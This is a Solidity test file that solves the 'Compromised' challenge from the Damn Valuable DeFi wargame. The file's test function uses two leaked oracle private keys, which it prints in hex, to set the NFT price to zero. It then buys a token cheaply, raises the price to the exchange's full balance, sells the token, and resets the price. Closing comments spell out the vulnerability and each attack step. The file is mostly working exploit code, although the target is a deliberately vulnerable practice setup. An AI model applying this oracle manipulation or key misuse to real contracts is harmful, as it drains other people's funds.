// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";

contract Compromised is Test {
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether);

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen;) {
            vm.deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen;) {
            symbols[i] = "DVNFT";
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen;) {
            initialPrices[i] = INITIAL_NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        damnValuableNFT = exchange.token();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        address first_source =
            vm.rememberKey(uint256(bytes32(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48)));
        address second_source =
            vm.rememberKey(uint256(bytes32(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9)));
        string memory symbol = "DVNFT";
        uint256 price_change = 0 ether;

        vm.startPrank(first_source);
        trustfulOracle.postPrice(symbol, price_change);
        vm.stopPrank();

        vm.startPrank(second_source);
        trustfulOracle.postPrice(symbol, price_change);
        vm.stopPrank();

        vm.startPrank(attacker);
        uint256 tokenid = exchange.buyOne{value: 0.1 ether}();
        damnValuableNFT.approve(address(exchange), tokenid);
        vm.stopPrank();

        uint256 price_change_again = EXCHANGE_INITIAL_ETH_BALANCE;

        vm.startPrank(first_source);
        trustfulOracle.postPrice(symbol, price_change_again);
        vm.stopPrank();

        vm.startPrank(second_source);
        trustfulOracle.postPrice(symbol, price_change_again);
        vm.stopPrank();

        vm.startPrank(attacker);
        exchange.sellOne(tokenid);
        vm.stopPrank();

        uint256 price_change_once_more = INITIAL_NFT_PRICE;

        vm.startPrank(first_source);
        trustfulOracle.postPrice(symbol, price_change_once_more);
        vm.stopPrank();

        vm.startPrank(second_source);
        trustfulOracle.postPrice(symbol, price_change_once_more);
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

// revealed private keys froms server response which can decrypted with hex -> base64 -> plaintext
// 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 -> source[1]
// 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 -> source[2]

// Vulnerability:
// Since the private keys of two sources out of three are revealed by the response, attacker can use to manipluate the prices of NFTs.
// Attack steps:
// 1. Through rememberKey option in foundry get the addresses for which we have private keys
// 2. Change the prices by postprice function in TrustOracle to 0. Through this Median is also 0.
// 3. Attacker can buy a NFT now using his 0.1 ETH.
// 4. Again increase the price of NFTs through source, this time price we are setting to exchange initial balance
// 5. Then the attacker can sell the NFT which he holds and in return he can get all exchange balance
// 6. finally changing back the price in oracle to initial price.
